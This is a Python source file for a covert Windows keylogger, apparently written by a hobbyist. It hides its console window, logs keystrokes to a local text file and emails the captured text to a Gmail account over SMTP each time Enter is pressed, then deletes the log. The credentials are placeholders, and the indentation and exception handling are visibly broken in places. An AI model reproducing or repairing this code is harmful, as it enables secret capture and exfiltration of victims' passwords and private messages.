#code owner sachin
#noob can also able to modify the code
# if you == "noob"
#     modify()


from pynput.keyboard import Key, Listener
import time
import os
import smtplib
import ctypes



ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)




path = "sub"
if not os.path.exists(path):
	os.system("mkdir sub")

x=""
sachin = " "
shiva = " [backspace] "
vishnu = " [Shift] "


def shift():
	 file = open("sub/file.txt" , "a")
         file.write(vishnu)
         file.close()

def ajay():
         file = open("sub/file.txt" , "a")
         file.write(sachin)
         file.close()


def darshan():
	 file = open("sub/file.txt" , "a")
	 file.write(shiva)
	 file.close()


def sac(key):
	xxx = str(key)
	pat = "sub/file.txt"
	if xxx == "Key.enter":
	  if os.path.exists(pat):
	       try:
		try:
        	 mes = open(pat, "r")
        	 meg = mes.read()
        	 mes.close()
		 hack = str(meg)


        	 email = 'SACHINSACHIN'
        	 server = smtplib.SMTP('smtp.gmail.com', 587)
        	 server.starttls()
        	 server.login(email,'passwordpassword')
        	 server.sendmail(email,email,hack)
        	 server.quit()
		 os.remove("sub/file.txt")
         	except socket.gaierror:
		  pass
	       except NameError:
		  pass
	if xxx == "Key.space":
		ajay()
	elif xxx == "Key.backspace":
		darshan()
	elif xxx == "Key.shift":
		shift()
	elif xxx == "Key.shift_r":
		shift()


	words = [ 'a','b','c','d','e','f','g','h','i',
         	  'j','k','l','m','n','o','p','q','r',
           	  's','t','u','v','w','x','y','z','A',
		  'B','C','D','E','F','G','H','I','J',
		  'K','L','M','N','O','P','Q','R','S',
		  'T','U','V','W','X','Y','Z','0','1',
		  '2','3','4','5','6','7','8','9','!',
		  '@','#','$','%','^','&','*','(',')',
		  '_','-','=','+','`','~','.']
	for w in words:
		xx = str(key)
		yy = "u"+"'"+w+"'"
		if xx == yy:
			x = yy[2]
			file = open("sub/file.txt" , "a")
			file.write(x)
			file.close()

with Listener(on_press=sac) as lis:
	lis.join()
